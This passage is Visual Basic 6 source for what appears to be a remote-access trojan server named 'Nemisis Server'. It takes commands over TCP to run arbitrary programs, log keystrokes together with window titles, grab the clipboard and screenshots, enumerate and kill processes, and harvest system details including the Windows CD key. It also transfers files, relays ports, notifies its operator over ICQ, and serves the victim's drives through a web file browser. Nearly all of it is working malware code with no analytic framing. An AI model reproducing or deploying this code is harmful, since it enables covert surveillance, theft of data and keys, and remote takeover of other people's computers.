            GetDrives = GetDrives & "<TR><TD><IMG SRC=""Fixed.gif"" ALT=""" & Drive & """> <A HREF=""?" & Drive & "\"">" & Drive & "\ - Hard Disk" & "</A></TD></TR>" & vbNewLine
            Case 3
            GetDrives = GetDrives & "<TR><TD><IMG SRC=""Network.gif"" ALT=""" & Drive & """> <A HREF=""?" & Drive & "\"">" & Drive & "\ - Network Drive" & "</A></TD></TR>" & vbNewLine
            Case 4
            GetDrives = GetDrives & "<TR><TD><IMG SRC=""CDROM.gif"" ALT=""" & Drive & """> <A HREF=""?" & Drive & "\"">" & Drive & "\ - Compact Disk" & "</A></TD></TR>" & vbNewLine
            Case 5
            GetDrives = GetDrives & "<TR><TD><IMG SRC=""Ramdisk.gif"" ALT=""" & Drive & """> <A HREF=""?" & Drive & "\"">" & Drive & "\ - Ramdisk Drive" & "</A></TD></TR>" & vbNewLine
        End Select
        DoEvents
    Next
    GetDrives = GetDrives & "</TABLE>" & vbNewLine & vbNewLine & "<HR><IMG SRC=""Search.gif"" ALT=""Search For Files""> <INPUT TYPE=""TEXT"" NAME=""strDrive"" SIZE=""20"" VALUE=""C:\""> <INPUT TYPE=""TEXT"" NAME=""strSearch"" SIZE=""30"" VALUE=""*.avi; *.mp3""> <INPUT TYPE=""BUTTON"" VALUE=""Search For Files"" ONCLICK=""startSearch()"">"
    Set FSO = Nothing
    Set Drive = Nothing
End Function

Private Function GetDirectory(ByVal Path As String) As String
    On Error Resume Next
    Dim WFD As WIN32_FIND_DATA, hFile As Long, Directory As String, File As String, tmpString As String, picFile As String, intFileSize As Long, strFileSize As String
    
    GetDirectory = "<TR><TD><IMG SRC=""Back.gif"" ALT=""Parent Directory""> <A HREF=""?" & ParsePath(Path) & """>Parent Directory</A></TD></TR>" & vbNewLine
    hFile = FindFirstFileA(Path & "*.*", WFD)
    If hFile <> -1 Then
        Do
            If (WFD.dwFileAttributes And vbDirectory) Then
                tmpString = StripNulls(WFD.cFileName)
                If Left$(tmpString, 1) <> "." Then
                    Directory = Directory & "<TR><TD><IMG SRC=""Folder.gif"" ALT=""" & tmpString & """> <A HREF=""?" & Path & tmpString & "\"">" & tmpString & "</A></TD></TR>" & vbNewLine
                End If
            Else
                tmpString = StripNulls(WFD.cFileName)
                Select Case LCase$(Mid$(tmpString, InStrRev(tmpString, ".") + 1))
                    Case "exe", "bat", "com", "scr"
                        picFile = "Executable.gif"
                    Case "sys", "dll", "vxd", "cpl"
                        picFile = "System.gif"
                    Case "mp3", "midi", "wav", "ram"
                        picFile = "Audio.gif"
                    Case "mpeg", "mpg", "avi", "asf", "rm", "swf", "wmv", "wma", "asx", "vob", "mov"
                        picFile = "Video.gif"
                    Case "jpg", "gif", "png", "bmp", "pdf", "pcx", "tif", "psd"
                        picFile = "Image.gif"
                    Case "txt", "log", "doc", "dat", "htm", "html", "rtf", "cfg", "nfo", "vbs"
                        picFile = "Text.gif"
                    Case Else
                    picFile = "Unknown.gif"
                End Select
                intFileSize = (WFD.nFileSizeLow \ 1024)
                If intFileSize <> 0 Then
                    strFileSize = Format$(intFileSize, "###,###,###")
                Else
                    strFileSize = 0
                End If
                File = File & "<TR><TD><IMG SRC=""" & picFile & """ ALT=""" & tmpString & """> <A HREF=""?" & Path & tmpString & """>" & tmpString & "</A></TD><TD WIDTH =""60%"">Size: " & strFileSize & " KB</TD></TR>" & vbNewLine
            End If
            DoEvents
        Loop While FindNextFileA(hFile, WFD)
    End If
    GetDirectory = GetDirectory & Directory & File
    FindClose hFile
End Function

Private Function ParsePath(ByVal strPath As String) As String
    On Error Resume Next
    Dim intForLoop As Long, I As Long
    
    If Len(strPath) > 3 Then
        strPath = Left$(strPath, (Len(strPath) - 1))
        intForLoop = Len(strPath)
        For I = 1 To intForLoop
            If Left$(Right$(strPath, I), 1) = "\" Then
                ParsePath = Left$(strPath, (Len(strPath) - I + 1))
                Exit For
            End If
            DoEvents
        Next
    Else
        ParsePath = vbNullString
    End If
End Function

Private Function HTTPFileExists(ByVal strFileName As String) As Boolean
    On Error Resume Next
    Dim WFD As WIN32_FIND_DATA, hFile As Long
    
    If Right$(strFileName, 1) = "\" Then
        If Len(strFileName) = 3 Then
            HTTPFileExists = True
            Exit Function
        Else
            strFileName = Left$(strFileName, Len(strFileName) - 1)
        End If
    End If
    hFile = FindFirstFileA(strFileName, WFD)
    HTTPFileExists = hFile <> -1
    FindClose hFile
End Function

Private Function ContentLabel(ByVal strFileExt As String, ByVal FileLength As Long) As String
    On Error Resume Next
    Dim strConType As String
    
    ContentLabel = "HTTP/1.1 200 OK" & vbNewLine
    ContentLabel = ContentLabel & "Accept-Ranges: bytes" & vbNewLine
    ContentLabel = ContentLabel & "Connection: close" & vbNewLine
    ContentLabel = ContentLabel & "Content-Length: " & FileLength & vbNewLine
    Select Case strFileExt
        Case "htm", "html"
        strConType = "text/html"
        Case "txt", "dat", "log"
        strConType = "text/plain"
        Case "doc"
        strConType = "application/msword"
        Case "pdf"
        strConType = "application/pdf"
        Case "jpg"
        strConType = "image/jpeg"
        Case "png"
        strConType = "image/png"
        Case "gif"
        strConType = "image/gif"
        Case "bmp"
        strConType = "image/bmp"
        Case "avi"
        strConType = "video/msvideo"
        Case "mpg", "mpeg"
        strConType = "video/mpeg"
        Case "asf"
        strConType = "video/x-ms-asf"
        Case "wmv"
        strConType = "video/x-ms-wmv"
        Case "ram"
        strConType = "audio/x-pn-realaudio"
        Case "rm"
        strConType = "audio/x-pn-realaudio-plugin"
        Case "midi"
        strConType = "audio/midi"
        Case "mp3"
        strConType = "audio/x-mpeg"
        Case "wav"
        strConType = "audio/x-wav"
        Case "swf"
        strConType = "x-shockwave-flash"
        Case Else
        strConType = "application"
    End Select
    ContentLabel = ContentLabel & "Content-Type: " & strConType & vbNewLine & vbNewLine
End Function

Private Sub TerminateProc(ByVal PID As Long)
    On Error GoTo ErrHandle
    Dim PROCESSIDX As Long, EXCODE As Long, PROCESS As Long
    
    PROCESSIDX = Processes(PID)
    PROCESS = OpenProcess(2035711, 0, PROCESSIDX)
    
    GetExitCodeProcess PROCESS, EXCODE
    TerminateProcess PROCESS, EXCODE
    CloseHandle PROCESS
    Exit Sub
ErrHandle: ErrHandler Err.Number, Err.Description
End Sub

Private Sub GetProc()
    On Error Resume Next
    Dim proc As PROCESSENTRY32, snap As Long, ret As Integer, Buffer As String, I As Integer
    
    snap = CreateToolhelp32Snapshot(15, 0)
    proc.dwSize = Len(proc)
    ret = Process32First(snap, proc)
    I = 0
    
    Do While ret <> 0
        I = I + 1
        Buffer = Buffer & "|" & StripNulls(proc.szExeFile)
        If Processes(I) <> proc.th32ProcessID Then
            Processes(I) = proc.th32ProcessID
        End If
        ret = Process32Next(snap, proc)
        DoEvents
    Loop
    
    CloseHandle snap
    sckTCP.SendData "12" & "|" & I & Buffer & "|"
End Sub

Private Sub PassOff_KeyDown(KeyCode As Integer, Shift As Integer)
    On Error Resume Next
    sckTCP.SendData "16" & GetCurrentWindow & "|" & KeyCode & "|" & Shift
End Sub

Private Function GetCurrentWindow() As String
    On Error Resume Next
    Dim RetVal As Integer
    
    GetCurrentWindow = Space$(255)
    RetVal = GetWindowTextA(GetForegroundWindow, GetCurrentWindow, 255)
    GetCurrentWindow = Left$(GetCurrentWindow, RetVal)
    If CurrentWindow <> GetCurrentWindow Then
        CurrentWindow = GetCurrentWindow
        If LenB(GetCurrentWindow) = 0 Then
            GetCurrentWindow = "Unknown Window"
        End If
        GetCurrentWindow = " (" & GetCurrentWindow & ") "
    Else
        GetCurrentWindow = vbNullString
    End If
End Function

Private Function PCInfo() As String
    On Error Resume Next
    Dim WinID As String
    
    If WinVer Then
        WinID = "SOFTWARE\Microsoft\Windows\CurrentVersion"
    Else
        WinID = "SOFTWARE\Microsoft\Windows NT\CurrentVersion"
    End If
    PCInfo = "OS: " & GetStringKey(-2147483646, WinID, "ProductName") & vbNewLine
    PCInfo = PCInfo & "Service Pack: " & GetStringKey(-2147483646, WinID, "CSDVersion") & vbNewLine
    PCInfo = PCInfo & vbNewLine & UserName & vbNewLine
    PCInfo = PCInfo & CompName & vbNewLine
    PCInfo = PCInfo & vbNewLine & "Registered Owner: " & GetStringKey(-2147483646, WinID, "RegisteredOwner") & vbNewLine
    PCInfo = PCInfo & "Registered Organization: " & GetStringKey(-2147483646, WinID, "RegisteredOrganization") & vbNewLine
    If WinVer Then
        PCInfo = PCInfo & "Windows CD-KEY: " & GetStringKey(-2147483646, WinID, "ProductKey") & vbNewLine
    Else
        PCInfo = PCInfo & "Windows CD-KEY: " & GetStringKey(-2147483646, WinID, "ProductID") & vbNewLine
    End If
    PCInfo = PCInfo & GetWinPath & vbNewLine
    PCInfo = PCInfo & "System Directory: " & GetSysPath & vbNewLine
    If WinVer Then
        PCInfo = PCInfo & vbNewLine & "Processor Name: " & GetStringKey(-2147483646, "HARDWARE\DESCRIPTION\System\CentralProcessor\0", "VendorIdentifier") & vbNewLine
    Else
        PCInfo = PCInfo & vbNewLine & "Processor Name: " & GetStringKey(-2147483646, "HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString") & vbNewLine
    End If
    PCInfo = PCInfo & GetMemoryInfo & vbNewLine
    PCInfo = PCInfo & ScreenRes & vbNewLine
    PCInfo = PCInfo & vbNewLine & "Uptime: " & ConvertTime(GetTickCount)
End Function

Private Function ConvertTime(ByVal lngMS As Long) As String
    On Error Resume Next
    Dim lngSeconds As Long, lngDays As Long, lngHours As Long, lngMins As Long
    
    lngSeconds = lngMS \ 1000
    lngDays = Int(lngSeconds \ 86400)
    lngSeconds = lngSeconds Mod 86400
    lngHours = Int(lngSeconds \ 3600)
    lngSeconds = lngSeconds Mod 3600
    lngMins = Int(lngSeconds \ 60)
    lngSeconds = lngSeconds Mod 60
    ConvertTime = lngDays & " Days, " & lngHours & " Hours, " & lngMins & " Minutes, " & lngSeconds & " Seconds"
End Function

Private Function GetWinPath() As String
    On Error Resume Next
    GetWinPath = Space$(260)
    GetWindowsDirectoryA GetWinPath, 260
    GetWinPath = "Windows Directory: " & GetWinPath
    GetWinPath = Trim$(GetWinPath)
    GetWinPath = Left$(GetWinPath, Len(GetWinPath) - 1)
End Function

Private Function GetSysPath() As String
    On Error Resume Next
    GetSysPath = Space$(260)
    GetSystemDirectoryA GetSysPath, 260
    GetSysPath = Trim$(GetSysPath)
    GetSysPath = Left$(GetSysPath, Len(GetSysPath) - 1)
End Function

Private Function CompName() As String
    On Error Resume Next
    CompName = Space$(100)
    GetComputerNameA CompName, 100
    CompName = Trim$(CompName)
    CompName = "Computer Name: " & Left$(CompName, Len(CompName) - 1)
End Function

Private Function UserName() As String
    On Error Resume Next
    UserName = Space$(100)
    GetUserNameA UserName, 100
    UserName = Trim$(UserName)
    UserName = "User Name: " & Left$(UserName, Len(UserName) - 1)
End Function

Private Function ScreenRes() As String
    On Error Resume Next
    Dim WW As Integer, HH As Integer
    
    WW = Screen.Width \ Screen.TwipsPerPixelX
    HH = Screen.Height \ Screen.TwipsPerPixelY
    ScreenRes = "Screen Resolution: " & WW & " by " & HH & " pixels"
End Function

Private Function GetMemoryInfo() As String
    On Error Resume Next
    Dim msMemory As MEMORYSTATUS
    
    GlobalMemoryStatus msMemory
    GetMemoryInfo = "Physical Memory: " & Format$(CStr(Int(msMemory.dwAvailPhys \ 1024)), "###,###,###") & " KB / " & Format$(CStr(Int(msMemory.dwTotalPhys \ 1024)), "###,###,###") & " KB"
End Function

Private Sub txtBar_KeyPress(KeyAscii As Integer)
    On Error Resume Next
    If KeyAscii = 13 Then
        Dim SData As String
        
        SData = "<Server> " & txtBar.Text & vbNewLine
        sckTCP.SendData "03" & SData
        txtChat.Text = txtChat.Text & "[" & Format$(Now, "HH:mm:ss") & "] " & SData
        txtBar.Text = vbNullString
    End If
End Sub

Private Sub txtChat_Change()
    On Error Resume Next
    If Len(txtChat.Text) > 0 Then
        txtChat.SelStart = Len(txtChat.Text) - 1
    End If
End Sub

Private Sub tmrOnTop_Timer()
    On Error Resume Next
    SetWindowPos hwnd, -1, 0, 0, 0, 0, 3
End Sub

Private Function DrvInfo(ByVal strDrive As String) As String
    On Error Resume Next
    GetInfo strDrive
    DrvInfo = "Drive: " & strDrive & vbNewLine
    DrvInfo = DrvInfo & "Label: " & m_Label & vbNewLine
    DrvInfo = DrvInfo & "Serial Number: " & m_SerialNumber & vbNewLine
    DrvInfo = DrvInfo & "Size: " & m_Size & vbNewLine
    DrvInfo = DrvInfo & "Free Space: " & m_FreeSpace & vbNewLine
    DrvInfo = DrvInfo & "Used Space: " & m_UsedSpace & vbNewLine
    DrvInfo = DrvInfo & "File System: " & m_FileSystem
End Function

Private Sub GetInfo(ByVal m_Drive As String)
    On Error Resume Next
    Dim BytesFreeToCalller As Currency, TotalBytes As Currency, TotalFreeBytes As Currency, VolumeSN As Long, MaxFNLen As Long, DrvVolumeName As String, DrvFileSystemName As String, DrvFileSystemFlags As Long
    
    GetDiskFreeSpaceExA m_Drive, BytesFreeToCalller, TotalBytes, TotalFreeBytes
    m_Size = Format$(TotalBytes * 10000, "###,###,###,##0")
    m_Size = Format$(m_Size \ 1048576, "###,###,###") & " MB (" & Format$(m_Size \ 1073741824, "##.#") & " GB)"
    m_FreeSpace = Format$(TotalFreeBytes * 10000, "###,###,###,##0")
    m_FreeSpace = Format$(m_FreeSpace \ 1048576, "###,###,###") & " MB (" & Format$(m_FreeSpace \ 1073741824, "##.#") & " GB)"
    m_UsedSpace = Format$((TotalBytes - TotalFreeBytes) * 10000, "###,###,###,##0")
    m_UsedSpace = Format$(m_UsedSpace \ 1048576, "###,###,###") & " MB (" & Format$(m_UsedSpace \ 1073741824, "##.#") & " GB)"
    DrvVolumeName = Space$(14)
    DrvFileSystemName = Space$(32)
    If GetVolumeInformationA(m_Drive, DrvVolumeName, Len(DrvVolumeName), VolumeSN, MaxFNLen, DrvFileSystemFlags, DrvFileSystemName, Len(DrvFileSystemName)) Then
        m_Label = StripNulls(DrvVolumeName)
        m_FileSystem = StripNulls(DrvFileSystemName)
        m_SerialNumber = Hex$(VolumeSN)
    End If
End Sub

Private Function DrvLbl(ByVal strDrive As String) As String
    On Error Resume Next
    Dim FSO As FileSystemObject, f As Drive
    
    Set FSO = CreateObject("Scripting.FileSystemObject")
    Set f = FSO.GetDrive(strDrive)
    sckTCP.SendData "26" & f.VolumeName
    Set FSO = Nothing
    Set f = Nothing
End Function

Private Function Properties(ByVal strFilePath As String, ByVal strEXEName As String, ByVal intIdent As Integer) As String
    On Error GoTo ErrHandle
    Dim FSO As FileSystemObject, fFile As File, fFolder As Folder

    Set FSO = CreateObject("Scripting.FileSystemObject")
    If intIdent = 0 Then
        Set fFile = FSO.GetFile(strFilePath & strEXEName)
        Properties = fFile.Type & "|" & fFile.Size & "|" & fFile.DateCreated & "|" & fFile.DateLastModified & "|" & fFile.DateLastAccessed & "|" & fFile.Attributes
    Else
        Set fFolder = FSO.GetFolder(strFilePath & "\" & strEXEName)
        Properties = fFolder.Type & "|" & fFolder.Size & "|" & fFolder.DateCreated & "|" & fFolder.DateLastModified & "|" & fFolder.DateLastAccessed & "|" & fFolder.Attributes
    End If
    Set FSO = Nothing
    Set fFile = Nothing
    Set fFolder = Nothing
    Exit Function
ErrHandle: ErrHandler Err.Number, Err.Description
End Function

Private Function GetList(ByVal Path As String) As String
    On Error Resume Next
    Dim WFD As WIN32_FIND_DATA, hFile As Long, Directory As String, File As String
    
    hFile = FindFirstFileA(Path & "*.*", WFD)
    If hFile <> -1 Then
        Do
            If (WFD.dwFileAttributes And vbDirectory) Then
                Directory = Directory & "?" & StripNulls(WFD.cFileName) & "|"
            Else
                File = File & StripNulls(WFD.cFileName) & "|"
            End If
            DoEvents
        Loop While FindNextFileA(hFile, WFD)
    End If
    If Len(Path) > 3 Then
        Directory = Right$(Directory, Len(Directory) - 7)
    End If
    GetList = Directory & File
    FindClose hFile
End Function

Private Sub MoveToBin(ByVal strFileName As String)
    On Error GoTo ErrHandle
    Dim SHop As SHFILEOPSTRUCT
    
    With SHop
        .wFunc = &H3
        .pFrom = strFileName
        .fFlags = &H40
    End With
    SHFileOperationA SHop
    Exit Sub
ErrHandle: ErrHandler Err.Number, Err.Description
End Sub

Private Sub Search(ByVal sRoot As String)
    On Error Resume Next
    Dim WFD As WIN32_FIND_DATA
    Dim hFile As Long
    
    hFile = FindFirstFileA(sRoot & "*.*", WFD)
    
    If hFile <> -1 Then
        Do
            With fp
                If .iFileCount = 15 Then
                    If Len(.sFiles) > 0 Then
                        sckTCP.SendData "18" & .sFiles
                        .iFileCount = 0
                        .sFiles = vbNullString
                    End If
                End If
            End With
            If (WFD.dwFileAttributes And vbDirectory) Then
                If AscW(WFD.cFileName) <> 46 Then
                    If fp.bRecurse Then
                        Search sRoot & StripNulls(WFD.cFileName) & "\"
                    End If
                End If
            Else
                If MatchSpec(WFD.cFileName, fp.sFileNameExt) Then
                    fp.iFileCount = fp.iFileCount + 1
                    fp.sFiles = fp.sFiles & sRoot & StripNulls(WFD.cFileName) & "|"
                End If
            End If
            DoEvents
        Loop While FindNextFileA(hFile, WFD)
    End If
    FindClose hFile
End Sub

Private Function MatchSpec(ByVal sFile As String, ByVal sSpec As String) As Boolean
    On Error Resume Next
    MatchSpec = PathMatchSpecW(StrPtr(sFile), StrPtr(sSpec))
End Function

Private Sub sckICQ_Connect()
    On Error Resume Next
    sckICQ.SendData ICQMessage(ICQNum)
End Sub

Private Sub sckOut_Connect(Index As Integer)
    On Error Resume Next
    Connected = True
End Sub

Private Sub sckICQ_SendComplete()
    On Error Resume Next
    sckICQ.Close
End Sub

Private Sub sckHTTP_SendComplete(Index As Integer)
    On Error Resume Next
    sckHTTP(Index).Close
End Sub

Private Sub sckDRV_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    ErrHandler Err.Number, Err.Description
End Sub

Private Sub sckFT_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    ErrHandler Err.Number, Err.Description
End Sub

Private Sub sckICQ_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    ErrHandler Err.Number, Err.Description
End Sub

Private Sub sckOut_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    ErrHandler Err.Number, Err.Description
End Sub

Private Sub sckIn_Error(Index As Integer, ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    ErrHandler Err.Number, Err.Description
End Sub

Private Sub sckTCP_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    ErrHandler Err.Number, Err.Description
End Sub

Private Sub sckTCP_ConnectionRequest(ByVal requestID As Long)
    On Error Resume Next
    sckTCP.Close
    sckTCP.Accept requestID
    DoEvents
    If PasswordOn Then
        sckTCP.SendData "04"
    Else
        sckFT.Close
        sckFT.LocalPort = 0
        sckFT.Listen
        sckTCP.SendData "15" & sckFT.LocalPort & "|" & ICQNum
    End If
End Sub

Private Sub sckDRV_ConnectionRequest(ByVal requestID As Long)
    On Error GoTo ErrHandle
    sckDRV.Close
    sckDRV.Accept requestID
    Exit Sub
ErrHandle: ErrHandler Err.Number, Err.Description
End Sub

Private Sub sckFT_ConnectionRequest(ByVal requestID As Long)
    On Error GoTo ErrHandle
    sckFT.Close
    sckFT.Accept requestID
    Exit Sub
ErrHandle: ErrHandler Err.Number, Err.Description
End Sub

Private Sub sckIn_ConnectionRequest(Index As Integer, ByVal requestID As Long)
    On Error Resume Next
    sckOut(Index).Connect
    Do
        DoEvents
    Loop Until Connected
    Connected = False
    sckIn(Index).Close
    sckIn(Index).Accept requestID
End Sub

Private Sub sckHTTP_ConnectionRequest(Index As Integer, ByVal requestID As Long)
    On Error Resume Next
    Dim intForLoop As Long, intReq As Integer, I As Long
    
    intForLoop = sckHTTP.UBound
    For I = 1 To intForLoop
        If sckHTTP(I).State <> 7 Then
            sckHTTP(I).Close
            sckHTTP(I).Accept requestID
            Exit Sub
        End If
        DoEvents
    Next
    intReq = sckHTTP.UBound + 1
    Load sckHTTP(intReq)
    sckHTTP(intReq).Accept requestID
End Sub

Private Sub sckTCP_Close()
    On Error Resume Next
    tmrOnTop.Enabled = False
    Me.Visible = False
    txtBar.Text = vbNullString
    txtChat.Text = vbNullString
    If KeyHook Then
        RemoveHook
    End If
    sckFT.Close
    sckDRV.Close
    sckTCP.Close
    sckTCP.LocalPort = PortNum
    sckTCP.Listen
End Sub

Private Sub sckIn_Close(Index As Integer)
    On Error Resume Next
    sckOut(Index).Close
    sckIn(Index).Close
    sckIn(Index).Listen
End Sub

Private Sub sckIn_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    On Error Resume Next
    Dim strData As String
    
    sckIn(Index).GetData strData, vbString
    sckOut(Index).SendData strData
End Sub

Private Sub sckOut_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    On Error Resume Next
    Dim strData As String
    
    sckOut(Index).GetData strData, vbString
    sckIn(Index).SendData strData
End Sub

Private Sub sckDRV_DataArrival(ByVal bytesTotal As Long)
    On Error GoTo ErrHandle
    Dim Data As String, Data2 As String, pD As String, FSO As FileSystemObject, d As Drive
    
    sckDRV.GetData Data
    Data2 = Right$(Data, (Len(Data) - 1))
    
    Select Case Left$(Data, 1)
        Case 0
            Set FSO = CreateObject("scripting.filesystemobject")
            For Each d In FSO.Drives
                Select Case d.DriveType
                    Case 0
                    pD = pD & d & " - UNKNOWN" & "|"
                    Case 1
                    pD = pD & d & " - REMOVABLE" & "|"
                    Case 2
                    pD = pD & d & " - FIXED" & "|"
                    Case 3
                    pD = pD & d & " - NETWORK" & "|"
                    Case 4
                    pD = pD & d & " - CD-ROM" & "|"
                    Case 5
                    pD = pD & d & " - RAMDISK" & "|"
                End Select
                DoEvents
            Next
            pD = "|" & pD
            sckDRV.SendData "0" & UCase$(pD)
            Set FSO = Nothing
            Set d = Nothing
    
        Case 1
            sckDRV.SendData "1" & "|" & GetList(Data2)
    
    End Select
    Exit Sub
ErrHandle: ErrHandler Err.Number, Err.Description
End Sub

Private Sub sckHTTP_DataArrival(Index As Integer, ByVal bytesTotal As Long)
    On Error Resume Next
    Dim strData As String, strDataParse() As String
    
    sckHTTP(Index).GetData strData, vbString
    strDataParse = Split(strData, " ")
    If Left$(strData, 3) = "GET" Then
        If Left$(strDataParse(1), 1) = "/" Then
            strDataParse(1) = Mid$(strDataParse(1), 2, Len(strDataParse(1)))
        End If
        If Left$(strDataParse(1), 1) = "?" Then
            strDataParse(1) = Mid$(strDataParse(1), 2, Len(strDataParse(1)))
        End If
        If Len(strDataParse(1)) > 1 Then
            strDataParse(1) = Replace(strDataParse(1), "%20", " ")
            If Mid$(strDataParse(1), 2, 1) = ":" Then
                If Right$(strDataParse(1), 1) = "\" Then
                
                    'Directory
                    If HTTPFileExists(strDataParse(1)) Then
                        strData = ContentLabel("html", Len(strData)) & httpDocType & "<TITLE>Index of " & strDataParse(1) & "</TITLE>" & httpHeadBody & "<H1>Index of " & strDataParse(1) & "</H1><HR>" & httpTable & GetDirectory(strDataParse(1)) & "</TABLE>" & vbNewLine & vbNewLine & "<HR><FONT SIZE =""2""><I>Nemisis Server at " & sckHTTP(0).LocalHostName & " Port 80</I></FONT></BODY></HTML>"
                        sckHTTP(Index).SendData strData
                        strData = vbNullString
                    Else
                        sckHTTP_SendComplete Index
                    End If
                ElseIf Mid$(strDataParse(1), Len(strDataParse(1)) - 3, 1) = "." Then
                
                    'File
                    If HTTPFileExists(strDataParse(1)) Then
                        Dim FileLength As Long, byteData() As Byte, intFile As Integer
                        intFile = FreeFile
                        Open strDataParse(1) For Binary Access Read As intFile
                            FileLength = LOF(intFile) - 1
                            ReDim byteData(0 To FileLength)
                            Get intFile, , byteData()
                        Close intFile
                        sckHTTP(Index).SendData ContentLabel(LCase$(Mid$(strDataParse(1), InStrRev(strDataParse(1), ".") + 1)), FileLength)
                        sckHTTP(Index).SendData byteData()
                        Erase byteData
                    Else
                        sckHTTP_SendComplete Index
                    End If
                Else
                    sckHTTP_SendComplete Index
                End If
                
            'Image
            ElseIf Right$(strDataParse(1), 3) = "gif" Then
                sckHTTP(Index).SendData ContentLabel("gif", 0)
                sckHTTP(Index).SendData LoadResData(UCase$(Left$(strDataParse(1), Len(strDataParse(1)) - 4)), "CUSTOM")
            
            'Search
            ElseIf Left$(strDataParse(1), 7) = "Search=" Then
                Dim strSearchField As String
                strDataParse = Split(strDataParse(1), "=")
                If LenB(strDataParse(2)) = 0 Then Exit Sub
                strSearchField = Mid$(strDataParse(1), 1, Len(strDataParse(1)) - 9)
                With fp
                    .sFileNameExt = strSearchField
                    .bRecurse = 1
                End With
                If Right$(strDataParse(2), 1) <> "\" Then strDataParse(2) = strDataParse(2) & "\"
                HTTPSearch strDataParse(2)
                strData = ContentLabel("html", Len(strData)) & httpDocType & "<TITLE>Search results for " & strSearchField & "</TITLE>" & httpHeadBody & "<H1>Search results for " & strSearchField & "</H1><HR>" & httpTable & "<TR><TD><IMG SRC=""Back.gif"" ALT=""Parent Directory""> <A HREF=""/"">Parent Directory</A></TD></TR>" & vbNewLine & fp.sFiles & "</TABLE>" & vbNewLine & vbNewLine & "<HR><FONT SIZE =""2""><I>Nemisis Server at " & sckHTTP(0).LocalHostName & " Port 80</I></FONT></BODY></HTML>"
                sckHTTP(Index).SendData strData
                strData = vbNullString
                fp.sFiles = vbNullString
            End If
            
        'My Computer
        Else
            HitCounter = HitCounter + 1
            strData = ContentLabel("html", Len(strData)) & httpDocType & "<TITLE>Index of " & sckHTTP(Index).LocalHostName & "</TITLE>" & httpHeadBody & "<SCRIPT LANGUAGE=""JavaScript"">function startSearch(){ location.href = ""?Search="" + strSearch.value + ""?Location="" + strDrive.value; }</SCRIPT><H1>Index of " & sckHTTP(Index).LocalHostName & "</H1><HR>" & httpTable & vbNewLine & GetDrives & vbNewLine & "<HR><FONT SIZE =""2""><I>Nemisis Server at " & sckHTTP(0).LocalHostName & " Port " & sckHTTP(0).LocalPort & "<BR>HitCounter: " & HitCounter & "<BR>IP Address: " & sckHTTP(0).RemoteHostIP & "</I></FONT></BODY></HTML>"
            sckHTTP(Index).SendData strData
            strData = vbNullString
        End If
    End If
    Erase strDataParse
End Sub

Private Sub sckFT_DataArrival(ByVal bytesTotal As Long)
    On Error GoTo ErrHandle
    Dim strData As String, FileBuffer As String, strParse() As String, intFile As Integer
    
    sckFT.GetData strData, vbString
    Select Case Left$(strData, 9)
        Case "SEND_FILE"
            strParse = Split(Right$(strData, Len(strData) - 9), "|")
            lngFileSize = strParse(1)
            intFile = FreeFile
            Open strParse(0) For Binary Access Write As intFile
            sckFT.SendData "ACPT_FILE"
            lngFileProg = 0
            Erase strParse
        Case "ACPT_FILE"
            intFile = FreeFile
            Open strFileName For Binary Access Read As intFile
            GoTo SendChunk
        Case "CHNK_FILE"
            GoTo SendChunk
        Case "DONE_FILE"
            Close intFile
            If ScreenShot Then
                Kill App.Path & "\Temp.dat"
                ScreenShot = False
            End If
        Case Else
            If (lngFileProg + 4096) < lngFileSize Then
                lngFileProg = lngFileProg + 4096
                Put intFile, , strData
                sckFT.SendData "CHNK_FILE"
            Else
                strData = Left$(strData, lngFileSize - lngFileProg)
                Put intFile, , strData
                sckFT.SendData "DONE_FILE"
                Close intFile
            End If
    End Select
    Exit Sub
SendChunk:
    FileBuffer = Space$(4096)
    Get intFile, , FileBuffer
    sckFT.SendData FileBuffer
    Exit Sub
ErrHandle: ErrHandler Err.Number, Err.Description
End Sub

Private Sub sckTCP_DataArrival(ByVal bytesTotal As Long)
    On Error GoTo ErrHandle
    Dim strData As String, cmdData As Long, strSplit() As String, retValue As Long
    
    sckTCP.GetData strData, vbString
    cmdData = Int(Left$(strData, 3))
    strData = Right$(strData, Len(strData) - 3)
    
    Select Case cmdData
        Case 0
            mciSendStringA "Set CDAudio Door Open", vbNull, 0, 0
        Case 1
            mciSendStringA "Set CDAudio Door Closed", vbNull, 0, 0
        Case 2
            ShellExecuteA Me.hwnd, "Open", strData, vbNullString, vbNullString, 1
        Case 3
            SwapMouseButton 1
        Case 4
            SwapMouseButton 0
        Case 5
            InitCapture
            Exit Sub
        Case 6
            ShowWindow FindWindowExA(FindWindowExA(FindWindowA("Progman", vbNullString), 0, "SHELLDLL_DefView", vbNullString), 0, "SysListView32", vbNullString), 0
        Case 7
            ShowWindow FindWindowExA(FindWindowExA(FindWindowA("Progman", vbNullString), 0, "SHELLDLL_DefView", vbNullString), 0, "SysListView32", vbNullString), 5
        Case 8
            retValue = FindWindowA("Shell_TrayWnd", vbNullString)
            ShowWindow retValue, 0
        Case 9
            retValue = FindWindowA("Shell_TrayWnd", vbNullString)
            ShowWindow retValue, 1
        Case 10
            InitChat Int(strData)
        Case 11
            txtChat.Text = txtChat.Text & "[" & Format$(Now, "HH:mm:ss") & "] " & strData
            Exit Sub
        Case 12
            Me.Visible = False
            tmrOnTop.Enabled = False
            SetWindowPos hwnd, -2, 0, 0, 0, 0, 3
        Case 13
            PassCheck strData
            Exit Sub
        Case 14
            sckTCP.SendData "10" & Clipboard.GetText
            Exit Sub
        Case 15
            strSplit = Split(strData, "|")
